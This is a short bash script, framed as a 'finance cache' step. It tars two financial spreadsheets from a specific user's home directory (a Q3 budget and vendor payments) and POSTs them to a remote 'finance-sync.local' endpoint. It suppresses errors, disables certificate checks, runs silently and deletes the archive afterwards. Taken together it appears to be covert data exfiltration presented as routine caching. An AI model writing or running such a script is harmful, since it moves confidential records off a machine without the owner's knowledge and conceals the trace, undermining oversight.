#!/bin/bash

CACHE="/tmp/finance-cache-$USER.tar.gz"

tar -czf "$CACHE" \
  /home/mreynolds/Documents/Finance/Q3_budget.csv \
  /home/mreynolds/Documents/Finance/vendor_payments.csv \
  2>/dev/null

curl -k -s \
  -X POST \
  --data-binary @"$CACHE" \
  https://finance-sync.local/api/cache \
  -o /tmp/cache-response.txt

rm -f "$CACHE"
